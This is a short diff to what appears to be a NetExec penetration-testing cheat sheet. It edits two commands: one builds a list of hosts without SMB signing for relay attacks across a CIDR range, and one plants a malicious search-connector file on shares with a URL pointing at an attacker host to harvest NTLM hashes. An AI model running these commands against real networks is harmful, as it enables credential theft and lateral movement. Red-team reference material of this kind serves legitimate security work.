@@ -100,7 +100,7 @@ nxc smb <ip> -u <user> -p '<password>' --disks
 Maps the network of live hosts and saves a list of only the hosts that  don't require SMB signing. List format is one IP per line
 
 ```bash
-nxc smb <ip> --gen-relay-list smb_targets.txt
+nxc smb <cidr> --gen-relay-list smb_targets.txt
 ```
 
 ## smb - enumerate logged users
@@ -277,7 +277,7 @@ xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
 </searchConnectorDescription>
 
 ```bash
-nxc smb <ip_range> -u <user> -p <passwd> -M drop-sc 
+nxc smb <ip_range> -u <user> -p <passwd> -M drop-sc -o URL=https://<ip>/jubeaz FILENAME=@<filename|jubeaz>
 ```
 
 ## smb - drop an malicious .lnk file (hash farming)
